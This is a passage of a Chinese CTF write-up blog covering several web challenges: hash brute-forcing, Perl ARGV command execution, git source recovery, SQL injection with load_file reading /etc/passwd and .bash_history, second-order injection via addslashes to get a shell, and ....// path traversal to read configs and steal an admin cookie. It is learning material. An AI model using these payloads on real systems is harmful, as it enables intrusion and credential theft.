title=\"总结\"></a>总结</h2><ul>\n<li>sql注入还是总结的不够，还需要再学习</li>\n</ul>\n<h1 id=\"ctfshow-web682-js爆破\"><a href=\"#ctfshow-web682-js爆破\" class=\"headerlink\" title=\"ctfshow web682(js爆破)\"></a>ctfshow web682(js爆破)</h1><h2 id=\"思路-14\"><a href=\"#思路-14\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>看hint发现是js代码</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/44.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里我想到是爆破了，但是我迷信于随机生成字符，结果一直爆破不出来</li>\n<li>这个<code>s2n2su</code>函数中的<code>c2n</code>函数会返回<code>a-f</code>的字符，但是我当时想别的字符也有可能，因为会返回0 </li>\n<li>其实我就可以先拿<code>a-f 0-9</code>试</li>\n</ul>\n<h2 id=\"wp-14\"><a href=\"#wp-14\" class=\"headerlink\" title=\"wp\"></a>wp</h2><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p>itertools 是 Python 标准库中的一个模块，包含了许多用于高效循环迭代的工具函数。<br>这个模块提供了一些用于生成迭代器的函数，可以帮助你更方便地处理迭代器、组合、排列、笛卡尔积等常见的组合计算问题。</p>\n<p>下面是一些常用的 itertools 函数：<br>count(start&#x3D;0, step&#x3D;1)：生成一个无限循环的迭代器，从 start 开始，每次增加 step，可用于产生无限的数字序列。<br>cycle(iterable)：将一个可迭代对象重复无限次，然后生成一个无限循环的迭代器，可用于反复遍历一个序列。<br>repeat(elem, n&#x3D;None)：生成一个重复 elem 元素 n 次的迭代器，如果 n 为 None，则生成一个无限重复的迭代器。<br>chain(*iterables)：将多个可迭代对象连接成一个迭代器，可用于将多个序列串联起来。<br>combinations(iterable, r)：生成一个包含所有长度为 r 的组合的迭代器，可用于枚举序列中所有长度为 r 的组合。<br>permutations(iterable, r&#x3D;None)：生成一个包含所有长度为 r 的排列的迭代器，如果 r 为 None，则生成包含所有排列的迭代器。<br>product(*iterables, repeat&#x3D;1)：生成一个多个可迭代对象的<strong>笛卡尔积</strong>的迭代器，可用于生成多个序列的组合。等等。</p>\n<ul>\n<li><p>笛卡尔积就是全排列，每个对象中取一个元素，返回所有可能的情况A<em>B</em>C</p>\n</div>\n</li>\n<li><p>这里学到了<code>itertools</code>模块，可以高效的迭代，<strong>不用手动写很多循环</strong></p>\n</li>\n<li><p>这个代码使用 itertools.product() 函数生成所有可能的由 string 中的字符组合而成的长度为4的组合。</p>\n</li>\n<li><p>这里就相当于写了4个for循环</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> itertools\n<span class=\"token keyword\">import</span> hashlib\n\nstring <span class=\"token operator\">=</span> <span class=\"token string\">\"0123456789abcdef\"</span>\ntarget_hash <span class=\"token operator\">=</span> <span class=\"token string\">\"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400\"</span>\n\n<span class=\"token keyword\">for</span> aaa <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    out1 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>aaa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> out1 <span class=\"token operator\">==</span> target_hash<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>aaa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>后面的就简单了，有个base32加密，直接用python base32解密就行了</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> base64\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">'GVSTMNDGGQ2DSOLBGUZA===='</span>\ndecode <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b32decode<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nstring1 <span class=\"token operator\">=</span> decode<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>encoding<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>string1<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>如果字节串的编码格式未知，可以使用 chardet 库来自动检测字节串的编码格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> chardet\n\nbyte_string <span class=\"token operator\">=</span> <span class=\"token string\">b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'</span>\nencoding <span class=\"token operator\">=</span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span>byte_string<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">]</span>\nstring <span class=\"token operator\">=</span> byte_string<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>encoding<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h1 id=\"攻防世界-i-got-id-200-难度6-perl文件上传\"><a href=\"#攻防世界-i-got-id-200-难度6-perl文件上传\" class=\"headerlink\" title=\"攻防世界 i-got-id-200(难度6) perl文件上传\"></a>攻防世界 i-got-id-200(难度6) perl文件上传</h1><h2 id=\"思路-15\"><a href=\"#思路-15\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>没有思路，烦死了</li>\n</ul>\n<h2 id=\"wp-15\"><a href=\"#wp-15\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p><a href=\"https://www.cnblogs.com/zhengna/p/13344832.html\">攻防世界-web-i-got-id-200（perl文件上传+ARGV造成任意文件读取和任意命令执行） - zhengna - 博客园</a></p>\n<ul>\n<li><p>都是.pl文件，.pl文件都是用perl编写的网页文件</p>\n</li>\n<li><p>尝试之后发现，文件上传界面，可以把传入的文件中的文件内容打印出来。</p>\n</li>\n<li><p>这就需要很了解这种语言的特性</p>\n</li>\n<li><p>猜测后台代码是</p>\n<pre class=\"line-numbers language-perl\" data-language=\"perl\"><code class=\"language-perl\"><span class=\"token keyword\">use</span> strict<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> warnings<span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">use</span> CGI<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">my</span> <span class=\"token variable\">$cgi</span><span class=\"token operator\">=</span> CGI<span class=\"token operator\">-></span>new<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$cgi</span><span class=\"token operator\">-></span>upload<span class=\"token punctuation\">(</span> <span class=\"token string\">'file'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">my</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span> <span class=\"token variable\">$cgi</span><span class=\"token operator\">-></span>param<span class=\"token punctuation\">(</span> <span class=\"token string\">'file'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">&lt;</span><span class=\"token variable\">$file</span><span class=\"token operator\">></span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">print</span> <span class=\"token string\">\"$_\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>这段代码使用param()方法获取文件名，用了尖括号符号&lt;&gt;，这表示从文件句柄中读取一行文本并赋值给变量$_。然后，print语句将$_打印到标准输出中。因此，这个while循环会一行一行地读取文件内容，直到文件结尾<br>:::tip<br>在给定的代码中，使用$cgi-&gt;param(‘file’)来获取上传文件的参数值。</p>\n</li>\n</ul>\n<ol>\n<li>如果上传了多个文件，则**$file只会包含列表中的第一个文件名或文件句柄，而其他文件名或文件句柄则会被忽略。 my $file&#x3D; $cgi-&gt;param( ‘file’ );这个代码返回的是文件内容**</li>\n</ol>\n<p>如果需要处理多个文件，使用列表遍历<br>my <a href=\"/files\">@files </a> &#x3D; $cgi-&gt;param(‘file’);<br>foreach my $file (<a href=\"/files\">@files) </a> ) { </p>\n<h1 id=\"处理每个文件\"><a href=\"#处理每个文件\" class=\"headerlink\" title=\"处理每个文件\"></a>处理每个文件</h1><p>}<br>:::</p>\n<ul>\n<li>因此如果我传入第一个文件的内容是<code>ARGV</code>，它读的就是参数中的值，因此构造一下参数，就可以了</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/45.png\" alt=\"image.png\"><br>:::tip<br>&#x2F;bin&#x2F;bash表示启用bash命令</p>\n<p>-c 选项用于指定要执行的命令<br>%20是空格，这里表示url的空格<br>${IFS}是分隔符，默认是\\t\\n，也就是命令的空格<br>bash -c ls |  表示执行ls \\ 并用管道(|)把它读到输入流中<br>:::</p>\n<h2 id=\"总结-8\"><a href=\"#总结-8\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li><code>perl</code>项目的目录位于<code>/var/www/cgi-bin/</code>下</li>\n<li>注意bash命令的使用</li>\n</ul>\n<h1 id=\"攻防世界-comment-难度7-git源码补全\"><a href=\"#攻防世界-comment-难度7-git源码补全\" class=\"headerlink\" title=\"攻防世界 comment(难度7) git源码补全\"></a>攻防世界 comment(难度7) git源码补全</h1><h2 id=\"思路-16\"><a href=\"#思路-16\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>上来有个登录密码的界面，就是让你爆破</li>\n<li>但是我没看出来</li>\n</ul>\n<h2 id=\"wp-16\"><a href=\"#wp-16\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p><img src=\"/../CTF-web-wp/46.png\" alt=\"image.png\"></p>\n<ul>\n<li>这种有提示的界面就是爆破，且一般就是数字</li>\n<li>写个脚本，爆破出来是666</li>\n<li>扫目录发现是git源码泄露，用Githack下载，但是下载后的源码不全</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/47.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里明显write，comment后应该有东西，因为提交的页面抓包是<code>write</code></li>\n<li>在console处，也可以发现</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/48.png\" alt=\"image.png\"></p>\n<h3 id=\"git源码恢复\"><a href=\"#git源码恢复\" class=\"headerlink\" title=\"git源码恢复\"></a>git源码恢复</h3><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p>git log –reflog<br>是 Git 中的一条命令，它可以显示 Git 引用日志，包括<strong>所有分支的提交历史记录</strong>和 HEAD 的更改历史记录。<br>引用日志只记录本地仓库的更改历史记录，而不记录远程仓库的更改历史记录。因此，如果你需要查看远程仓库的更改历史记录，需要使用其他 Git 命令。<br>git reset –hard<br><strong>git reset –hard 是 Git 中的一条命令，它可以将当前分支重置为指定的提交</strong>，并丢弃工作目录和暂存区中的任何更改。<br>当你运行 git reset –hard 命令时，Git 首先将 HEAD 指针移动到指定的提交。这意味着当前分支现在指向指定的提交，之后该提交之后对分支所做的任何更改都不再可用。然后，它将工作目录和暂存区重置为与指定提交时分支状态相匹配的状态。这意味着所有在指定提交后对工作目录或暂存区中的文件所做的更改都将被丢弃，并且文件将被恢复到该提交时的状态</p>\n</div>\n<ul>\n<li>运行<code>git log --reflog</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/49.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里表示最近的提交是一个合并提交（Merge），它将两个父提交（bfbdf21 和 5556e3a）合并成一个新的提交（e5b2a24）。</li>\n<li>恢复到这个状态<code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/50.png\" alt=\"image.png\"><br><img src=\"/../CTF-web-wp/51.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>这个我就不太懂了，wp说catgory没过滤</p>\n</li>\n<li><p>这里就可以用单引号闭合</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">category<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">,</span>content<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/*&amp;content=*/</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>注意这里要多行注释，中间执行不了用括号</p>\n</li>\n<li><p>但是整了一圈发现数据库里没什么东西，而且也不可写，我就没招了</p>\n</li>\n<li><p>查看<code>/etc/passwd</code></p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/52.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>可以看到www用户使用了bash操作，查看base的历史</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'/home/www/.bash_history'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/../CTF-web-wp/53.png\" alt=\"image.png\"></p>\n</li>\n<li><p>这里它先cd到<code>tmp</code>目录，解压了<code>html.zip</code>，又把所有的东西复制到了<code>/var/www</code>目录下，此时删除<code>/var/www/html</code>下的<code>.DS_Store</code></p>\n</li>\n<li><p>说明之前的<code>html</code>目录下有<code>.DS_Store</code></p>\n</li>\n<li><p>load_file加载文件，并解密</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/54.png\" alt=\"image.png\"></p>\n<ul>\n<li>load_file加载文件即可</li>\n</ul>\n<h1 id=\"攻防世界-filemanager-难度7\"><a href=\"#攻防世界-filemanager-难度7\" class=\"headerlink\" title=\"攻防世界 filemanager(难度7)\"></a>攻防世界 filemanager(难度7)</h1><h2 id=\"思路-17\"><a href=\"#思路-17\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>扫目录看到有源码泄露</li>\n<li>代码审计，不知道咋做</li>\n<li>(这个时候我刚和dragon研究明白<code>addslashes</code>)</li>\n</ul>\n<h2 id=\"addslashes-1\"><a href=\"#addslashes-1\" class=\"headerlink\" title=\"addslashes\"></a>addslashes</h2><p><img src=\"/../CTF-web-wp/55.png\" alt=\"ea8cf6943033e6df86b27eaae7bd3fc.png\"></p>\n<ul>\n<li>addslashes后，在存入数据库时，并不会加入反斜杠，也就是你写啥就存啥</li>\n<li>但是当你从数据库中再取出来用的时候，这时候我之前构造的sql语句就会执行</li>\n<li><strong>所以重点关注addslashes后，什么从数据库中取出来了，并放在了SQL语句中，因为这样就可以执行我构造的命令了</strong></li>\n</ul>\n<h2 id=\"wp-17\"><a href=\"#wp-17\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>查看源码</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/56.png\" alt=\"image.png\"></p>\n<ul>\n<li>发现这里会把存入的扩展名取出来，也就是这个<code>oldname、extension</code>是我可以构造的</li>\n<li>这题显然是<code>getshell</code>，关键是我如何把一个后缀改成<code>.php</code></li>\n<li><strong>后缀相同咋重命名？</strong></li>\n<li><strong>除非后缀为空。（卧槽，像是狄大人破案）</strong></li>\n<li>显然我可以把上传的文件扩展名构造成空的。但是此时这个文件的文件名是1.txt.txt</li>\n<li>如果我直接改1.txt.txt—&gt;1.php</li>\n<li>也就是此时<code>file_exists(&#39;1.txt&#39;)</code>，但是 并不存在<code>1.txt</code>的文件</li>\n<li>所以我需要再上传一个1.txt，此时能过判断，再把<code>1.txt.txt</code>改成1.php，此时没有之前的后缀了，就改成功了</li>\n</ul>\n<h2 id=\"总结-9\"><a href=\"#总结-9\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>找到<code>addslashes</code>后，又取出来放在sql语句中的地方</li>\n<li>还要很耐心才可以取得最后的flag</li>\n</ul>\n<h1 id=\"攻防世界-Web-php-wrong-nginx-config-难度7\"><a href=\"#攻防世界-Web-php-wrong-nginx-config-难度7\" class=\"headerlink\" title=\"攻防世界 Web_php_wrong_nginx_config(难度7)\"></a>攻防世界 Web_php_wrong_nginx_config(难度7)</h1><h2 id=\"思路-18\"><a href=\"#思路-18\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>我如何获取到nginx的配置文件呢？<code>/etc/nginx/sites-enabled/site.conf</code></li>\n<li>文件包含，或者读源码</li>\n<li>现在有输入框，但是测试了没什么反应</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/57.png\" alt=\"image.png\"></p>\n<ul>\n<li>有可能是这里么？</li>\n</ul>\n<h2 id=\"wp-18\"><a href=\"#wp-18\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>我上面的猜想是对的，但是我不知道<code>....//</code>可以绕过<code>../</code>，没想到目录穿越</li>\n<li>访问<code>....//....//....//....//etc/nginx/sites-enabled/site.conf</code>时，可以看到配置文件</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/58.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里我访问<code>/web-img../</code>，就会目录穿越</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/59.png\" alt=\"image.png\"></p>\n<ul>\n<li>后面的暂时不会</li>\n</ul>\n<h1 id=\"攻防世界-wtf-sh-150-难度7-目录穿越-shell源码审计\"><a href=\"#攻防世界-wtf-sh-150-难度7-目录穿越-shell源码审计\" class=\"headerlink\" title=\"攻防世界 wtf.sh-150(难度7)目录穿越+shell源码审计\"></a>攻防世界 wtf.sh-150(难度7)目录穿越+shell源码审计</h1><h2 id=\"思路-19\"><a href=\"#思路-19\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题上来好多页面，不想看就</li>\n<li>抓包发现这里可能有问题</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/60.png\" alt=\"image.png\"></p>\n<ul>\n<li>要不然就是admin处存在sql注入</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/61.png\" alt=\"image.png\"></p>\n<ul>\n<li>这个token现在我也看不出来啥东西，有可能是某种加密方式？试了base64，解不出来</li>\n</ul>\n<h2 id=\"wp-19\"><a href=\"#wp-19\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>这种很复杂的题，上来就想目录穿越</li>\n<li>先别考虑sql注入什么的</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/62.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里测试的时候，不只是要在<code>?post=K81aH../</code>，还要试试<code>post.wtf?post=../</code></li>\n<li>这里就可以发现源码泄露，接着就是要耐心的源码审计</li>\n<li>然后可以发现</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/63.png\" alt=\"image.png\"></p>\n<ul>\n<li>也就是登陆时的cookie要改成admin的<code>cookie</code>，于是需要找到admin的<code>cookie</code></li>\n<li>在源码中全局搜索admin的相关信息</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/64.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里发现有个<code>users</code>目录，看看能不能穿越到该目录</li>\n<li>穿越成功，发现admin的cookie，于是抓包登录</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/65.png\" alt=\"image.png\"><br><img src=\"/../CTF-web-wp/66.png\" alt=\"image.png\"></p>\n<ul>\n<li>但是这样直接登录没反应，其实是因为界面没有变化，还是我注册的普通用户，那我就在proxy界面改</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/67.png\" alt=\"image.png\"></p>\n<ul>\n<li>此时再次抓包，就可以了</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/68.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>但是这里只有半个flag，cnmd，接着进入漫长的代码审计</p>\n</li>\n<li><p>这里发现服务器是可以执行<code>.wtf</code>文件的</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token keyword\">function</span> <span class=\"token function-name function\">include_page</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\"># include_page &lt;pathname></span>\n    <span class=\"token builtin class-name\">local</span> <span class=\"token assign-left variable\">pathname</span><span class=\"token operator\">=</span><span class=\"token variable\">$1</span>\n    <span class=\"token builtin class-name\">local</span> <span class=\"token assign-left variable\">cmd</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token string\">\"<span class=\"token variable\">$&#123;pathname<span class=\"token operator\">:</span>(-4)&#125;</span>\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">'.wtf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin class-name\">local</span> <span class=\"token assign-left variable\">can_execute</span><span class=\"token operator\">=</span><span class=\"token variable\">$?</span>\n    <span class=\"token assign-left variable\">page_include_depth</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$((</span>$page_include_depth<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token variable\">))</span></span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token variable\">$page_include_depth</span> <span class=\"token parameter variable\">-lt</span> <span class=\"token variable\">$max_page_include_depth</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span>\n        <span class=\"token builtin class-name\">local</span> line\n        <span class=\"token keyword\">while</span> <span class=\"token builtin class-name\">read</span> <span class=\"token parameter variable\">-r</span> line<span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span>\n            <span class=\"token comment\"># check if we're in a script line or not ($ at the beginning implies script line)</span>\n            <span class=\"token comment\"># also, our extension needs to be .wtf</span>\n            <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token string\">\"$\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"<span class=\"token variable\">$&#123;line<span class=\"token operator\">:</span>0<span class=\"token operator\">:</span>1&#125;</span>\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$&#123;can_execute&#125;</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token assign-left variable\">is_script</span><span class=\"token operator\">=</span><span class=\"token variable\">$?</span>\n            <span class=\"token comment\"># execute the line.</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token variable\">$is_script</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span>\n                <span class=\"token assign-left variable\">cmd</span><span class=\"token operator\">+=</span><span class=\"token string\">$'<span class=\"token entity\" title=\"\\n\">\\n</span>'</span><span class=\"token string\">\"$&#123;line#\"</span>$<span class=\"token string\">\"&#125;\"</span>\n            <span class=\"token keyword\">else</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token parameter variable\">-n</span> <span class=\"token variable\">$cmd</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span>\n                    <span class=\"token builtin class-name\">eval</span> <span class=\"token string\">\"<span class=\"token variable\">$cmd</span>\"</span> <span class=\"token operator\">||</span> log <span class=\"token string\">\"Error during execution of <span class=\"token variable\">$&#123;cmd&#125;</span>\"</span>\n                    <span class=\"token assign-left variable\">cmd</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n                <span class=\"token keyword\">fi</span>\n                <span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$line</span>\n            <span class=\"token keyword\">fi</span>\n        <span class=\"token keyword\">done</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$&#123;pathname&#125;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"&lt;p>Max include depth exceeded!&lt;p>\"</span>\n    <span class=\"token keyword\">fi</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" 